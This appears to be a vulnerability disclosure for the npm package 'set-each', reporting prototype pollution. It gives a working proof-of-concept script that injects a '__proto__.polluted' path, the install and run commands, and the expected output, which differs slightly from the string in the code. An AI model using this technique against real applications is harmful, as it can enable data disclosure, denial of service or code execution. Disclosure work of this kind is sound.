# Description

`set-each` is vulnerable to `Prototype Pollution`.
This package fails to restrict access to prototypes of objects, allowing for modification of prototype behavior using a `proto` payload, which may result in Sensitive Information Disclosure/Denial of Service(DoS)/Remote Code Execution.


# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var setEach = require("set-each")
const obj = [{}]
console.log("Before : " + {}.polluted); 
setEach.setEach(obj, 'Yes! Its Polluted', '__proto__.polluted')
console.log("After : " + {}.polluted);
```
2. Execute the following commands in another terminal:

```
npm i set-each # Install affected module
node poc.js #  Run the PoC
```
3. Check the Output:
```
Before : undefined
After : Yes! It's Polluted
```
